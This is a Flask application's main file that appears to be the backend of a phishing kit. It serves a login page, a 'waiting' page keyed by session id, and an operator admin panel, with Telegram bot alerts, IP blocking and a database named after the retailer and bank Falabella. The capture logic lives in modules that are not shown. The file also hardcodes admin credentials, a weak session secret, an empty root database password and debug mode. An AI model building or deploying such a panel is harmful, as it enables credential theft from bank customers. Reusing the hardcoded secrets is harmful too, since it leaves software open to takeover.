from flask import Flask, render_template, request, redirect, session
from modules.api_logic import process_api_logic
from modules.form_logic import process_forms
from modules.ip_block import block_ip_if_needed
from modules.db import get_connection
import os

app = Flask(__name__)
app.secret_key = "clave_super_segura_123"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

config = {
    "db_host": "localhost",
    "db_name": "falabella",
    "db_user": "root",
    "db_pass": "",

    "telegram_bot_token": "",
    "telegram_chat_id": "",

    "admin_user": "admin",
    "admin_pass": "password1234",

    "offline_threshold": 20,

    "ip_block_file": os.path.join(BASE_DIR, "data", "ip_blocked.txt")
}

os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
if not os.path.exists(config["ip_block_file"]):
    open(config["ip_block_file"], "w").close()


# ===========================
# BLOQUEO IP
# ===========================
@app.before_request
def seguridad():
    resp = block_ip_if_needed(config)
    if resp:
        return resp


# ===========================
# VISTAS HTML
# ===========================
@app.route("/")
def login_view():
    return render_template("login_page.html")


@app.route("/espera")
def espera_view():
    session_id = request.args.get("id")
    return render_template("waiting_page.html", session_id=session_id)


@app.route("/panel")
def panel_view():
    return render_template("admin_panel.html")


# ===========================
# FORMULARIOS DEL CLIENTE
# ===========================
@app.route("/form", methods=["POST"])
def form_handler():
    conn = get_connection(config)
    result = process_forms(request, conn, config)
    conn.close()
    return result


# ===========================
# API DEL PANEL ADMIN
# ===========================
@app.route("/api", methods=["GET", "POST"])
def api_handler():
    conn = get_connection(config)
    result = process_api_logic(request, conn, config)
    conn.close()
    return result


# ===========================
# RUN SERVER
# ===========================
if __name__ == "__main__":
    print("Servidor en http://127.0.0.1:5000")
    app.run(debug=True)
